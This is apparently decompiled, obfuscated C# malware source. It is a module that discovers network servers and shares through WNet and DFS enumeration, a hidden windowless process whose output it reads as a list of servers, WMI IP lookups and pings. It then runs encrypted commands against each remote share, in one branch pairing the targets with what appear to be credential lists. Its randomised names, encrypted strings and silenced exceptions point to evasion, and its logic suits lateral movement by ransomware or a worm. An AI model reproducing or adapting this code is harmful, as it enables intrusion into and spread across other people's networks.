using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace RshJmeUGgeNp;

internal sealed class UyCARjEFSIXYy
{
	public sealed class emMSqUoxJchm
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum uSgqmIaufMDSx
	{
		fGOvFSmEVyI = 1,
		uZsrePxyKZ,
		TCmJkyhJgNhdQ,
		JfFnmlucPM,
		hRCKzEuwHduHmvV
	}

	public enum CpZUvJNWuKgG
	{
		QPoMUULzdIafMIrBHe,
		nzQapyKQPDVn,
		GPjGEQrifDDDA,
		hQzPVLMecMjDFE
	}

	public enum QxGbSiIMnxw
	{
		VVtTLMBWCpVvWAL = 1,
		FpfPZdZaldMAYdWJ = 2,
		mydmKsHPpEkxR = 4,
		PzILHYVTeVdlb = 8,
		zKaJdsUpasLQyR = 16,
		IImERfVPCZ = 19
	}

	public enum aYESdiVICSQlMeY
	{
		isShvhPvabVonxm,
		PndALbKWFfpcQf,
		sqfvyolzmqOY,
		uFNoBGXjee,
		JwwdiZFzvR,
		cYTAYEgxWjgeP,
		BUnsXaRcYUJBo,
		SClhxneXgWlfT,
		UmzqHFMHRfvnYQL,
		tHGgLEQbnZjb,
		mtAOWEYtwEKi,
		eMiKBylGUZlWc
	}

	public sealed class WcqolnoxkwtFHuAC : IEnumerable
	{
		private enum WZwnbgmBHMVsZ
		{
			fSIfKsFgmsRpaH = 0,
			PzQOnnWHERBtzh = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class earrCEoSBmO
		{
			public uSgqmIaufMDSx NxfGnqHshXjF;

			public CpZUvJNWuKgG IefyVRUVRDa;

			public aYESdiVICSQlMeY ZrcPyxdsaeQOFzT;

			public QxGbSiIMnxw kpUIZaCOhZO;

			public string dkIkSnuEMaYab;

			public string tAeoBJfjlpIGqMV;

			public string VpEUZyhEIKhEkJ;

			public string awAvgbwRoSQc;
		}

		private ArrayList CLPIyHCUFrfN = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern WZwnbgmBHMVsZ WNetOpenEnumA(uSgqmIaufMDSx dwScope, CpZUvJNWuKgG dwType, QxGbSiIMnxw dwUsage, earrCEoSBmO p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern WZwnbgmBHMVsZ WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern WZwnbgmBHMVsZ WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(earrCEoSBmO earrCEoSBmO_0, uSgqmIaufMDSx uSgqmIaufMDSx_0, CpZUvJNWuKgG cpZUvJNWuKgG_0, QxGbSiIMnxw qxGbSiIMnxw_0, aYESdiVICSQlMeY aYESdiVICSQlMeY_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(uSgqmIaufMDSx_0, cpZUvJNWuKgG_0, qxGbSiIMnxw_0, earrCEoSBmO_0, out lphEnum) == WZwnbgmBHMVsZ.fSIfKsFgmsRpaH)
			{
				WZwnbgmBHMVsZ wZwnbgmBHMVsZ;
				do
				{
					wZwnbgmBHMVsZ = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (wZwnbgmBHMVsZ)
					{
					case WZwnbgmBHMVsZ.PzQOnnWHERBtzh:
						continue;
					case WZwnbgmBHMVsZ.fSIfKsFgmsRpaH:
						Marshal.PtrToStructure(intPtr, earrCEoSBmO_0);
						if (earrCEoSBmO_0.ZrcPyxdsaeQOFzT == aYESdiVICSQlMeY_0)
						{
							CLPIyHCUFrfN.Add(earrCEoSBmO_0.tAeoBJfjlpIGqMV);
						}
						if ((earrCEoSBmO_0.kpUIZaCOhZO & QxGbSiIMnxw.FpfPZdZaldMAYdWJ) == QxGbSiIMnxw.FpfPZdZaldMAYdWJ)
						{
							EnumerateServers(earrCEoSBmO_0, uSgqmIaufMDSx_0, cpZUvJNWuKgG_0, qxGbSiIMnxw_0, aYESdiVICSQlMeY_0);
						}
						continue;
					}
					break;
				}
				while (wZwnbgmBHMVsZ != WZwnbgmBHMVsZ.PzQOnnWHERBtzh);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public WcqolnoxkwtFHuAC(uSgqmIaufMDSx uSgqmIaufMDSx_0, CpZUvJNWuKgG cpZUvJNWuKgG_0, QxGbSiIMnxw qxGbSiIMnxw_0, aYESdiVICSQlMeY aYESdiVICSQlMeY_0)
		{
			earrCEoSBmO earrCEoSBmO_ = new earrCEoSBmO();
			EnumerateServers(earrCEoSBmO_, uSgqmIaufMDSx_0, cpZUvJNWuKgG_0, qxGbSiIMnxw_0, aYESdiVICSQlMeY_0);
		}

		public IEnumerator GetEnumerator()
		{
			return CLPIyHCUFrfN.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct XVCzUQmITR
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string hqCsKmIgLQtBy;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string treDsWKTIbLkNS;

		public uint AbHiJopPqirCO;

		public uint PZazcYycUTzjaTx;

		public IntPtr tblggEdIrml;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct fJagxnBJwUzOi
	{
		public int AbHiJopPqirCO;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string htNeuhWqXjLl;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string EQCvXxqkvMX;
	}

	public struct hXtdQcyXEEBrgWkoN
	{
		public string rTwFPltenQmGet;

		public string[] zOoDXfAgCPsrnnAe;

		public hXtdQcyXEEBrgWkoN(string string_0, string[] string_1)
		{
			rTwFPltenQmGet = string_0;
			zOoDXfAgCPsrnnAe = string_1;
		}
	}

	private sealed class VSuDIKWVvsOh
	{
		public string jhbxOxEOirpJKm;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != jhbxOxEOirpJKm;
		}
	}

	public static List<string> brwnuCUxQmg;

	public static string JoscjyWLyGvfPub;

	public static List<string> CToWTQcSnuDEqsm;

	public static List<string> rtAVvpZsvLZK;

	public static List<string> GsUFJmjVNHhxeFv;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<emMSqUoxJchm> CTbHBkWmiFjUc()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107396795);
			process.StartInfo.Arguments = getString_0(107404975);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<emMSqUoxJchm> list = new List<emMSqUoxJchm>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107405438))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new emMSqUoxJchm
						{
							ServerName = getString_0(107396800) + stringBuilder.ToString() + getString_0(107405393)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string qDkzSAyyhPH, int UMbjTuWZOQDvw, int ShJvMreOCOmK, out IntPtr gtPyXgBTmiae, [MarshalAs(UnmanagedType.I4)] out int QzGhBiJOFHJO, [MarshalAs(UnmanagedType.I4)] ref int qAVOulmgwGDTIh);

	public static List<hXtdQcyXEEBrgWkoN> zOaHLSlusevNIjsm(string string_0)
	{
		try
		{
			List<hXtdQcyXEEBrgWkoN> list = new List<hXtdQcyXEEBrgWkoN>();
			IntPtr gtPyXgBTmiae = default(IntPtr);
			int QzGhBiJOFHJO = 0;
			int qAVOulmgwGDTIh = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out gtPyXgBTmiae, out QzGhBiJOFHJO, ref qAVOulmgwGDTIh) == 0)
			{
				for (int i = 0; i < QzGhBiJOFHJO; i++)
				{
					XVCzUQmITR xVCzUQmITR = (XVCzUQmITR)Marshal.PtrToStructure(gtPyXgBTmiae + i * Marshal.SizeOf(typeof(XVCzUQmITR)), typeof(XVCzUQmITR));
					if (xVCzUQmITR.hqCsKmIgLQtBy == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < xVCzUQmITR.PZazcYycUTzjaTx; j++)
					{
						IntPtr ptr = new IntPtr(xVCzUQmITR.tblggEdIrml.ToInt64() + j * Marshal.SizeOf(typeof(fJagxnBJwUzOi)));
						fJagxnBJwUzOi fJagxnBJwUzOi = (fJagxnBJwUzOi)Marshal.PtrToStructure(ptr, typeof(fJagxnBJwUzOi));
						if (fJagxnBJwUzOi.AbHiJopPqirCO == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107391133),
								fJagxnBJwUzOi.htNeuhWqXjLl,
								fJagxnBJwUzOi.EQCvXxqkvMX
							}));
						}
					}
					string text = xVCzUQmITR.hqCsKmIgLQtBy.Replace(string_0, getString_0(107394013));
					if (text.StartsWith(getString_0(107396800)))
					{
						text = text.Substring(1);
					}
					list.Add(new hXtdQcyXEEBrgWkoN(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void xErCUNrULlb()
	{
		RvpNXHMAnDGj.MdrmbcHVOrzfshXi(getString_0(107405416));
		List<emMSqUoxJchm> list = CTbHBkWmiFjUc();
		List<hXtdQcyXEEBrgWkoN> list2 = zOaHLSlusevNIjsm(Environment.MachineName);
		if (list2 != null)
		{
			foreach (hXtdQcyXEEBrgWkoN item in list2)
			{
				string[] zOoDXfAgCPsrnnAe = item.zOoDXfAgCPsrnnAe;
				foreach (string text in zOoDXfAgCPsrnnAe)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (RvpNXHMAnDGj.WcRXWlGGUWcMizS == getString_0(107396942))
						{
							for (int j = 0; j < CToWTQcSnuDEqsm.Count; j++)
							{
								RvpNXHMAnDGj.sonqSVTFpSTJ(getString_0(107392682), getString_0(107393041) + text + getString_0(107393140) + CToWTQcSnuDEqsm[j] + getString_0(107393159) + rtAVvpZsvLZK[j]);
							}
						}
						else
						{
							RvpNXHMAnDGj.sonqSVTFpSTJ(getString_0(107392682), getString_0(107393041) + text);
						}
						RvpNXHMAnDGj.jdESWHKNpYUqO.Add(text.Replace(getString_0(107391146), getString_0(107394013)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (emMSqUoxJchm item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (RvpNXHMAnDGj.WcRXWlGGUWcMizS == getString_0(107396942))
				{
					for (int k = 0; k < CToWTQcSnuDEqsm.Count; k++)
					{
						RvpNXHMAnDGj.sonqSVTFpSTJ(getString_0(107392682), getString_0(107393041) + item2.ServerName + getString_0(107393140) + CToWTQcSnuDEqsm[k] + getString_0(107393159) + rtAVvpZsvLZK[k]);
					}
				}
				else
				{
					RvpNXHMAnDGj.sonqSVTFpSTJ(getString_0(107392682), getString_0(107393041) + item2.ServerName);
				}
				RvpNXHMAnDGj.jdESWHKNpYUqO.Add(item2.ServerName.Replace(getString_0(107391146), getString_0(107394013)));
			}
			catch
			{
			}
		}
	}

	public static bool pjOXfvktOBhefX(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static List<string> XccogXvurzSiAmm()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107405299));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107405234)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107405253));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				VSuDIKWVvsOh CS_0024_003C_003E8__locals0 = new VSuDIKWVvsOh();
				CS_0024_003C_003E8__locals0.jhbxOxEOirpJKm = array4[j];
				if (CS_0024_003C_003E8__locals0.jhbxOxEOirpJKm.Contains(getString_0(107405208)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.jhbxOxEOirpJKm).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static UyCARjEFSIXYy()
	{
		Strings.CreateGetStringDelegate(typeof(UyCARjEFSIXYy));
		brwnuCUxQmg = new List<string>();
		JoscjyWLyGvfPub = getString_0(107394013);
		CToWTQcSnuDEqsm = new List<string>();
		rtAVvpZsvLZK = new List<string>();
		GsUFJmjVNHhxeFv = new List<string>();
	}
}
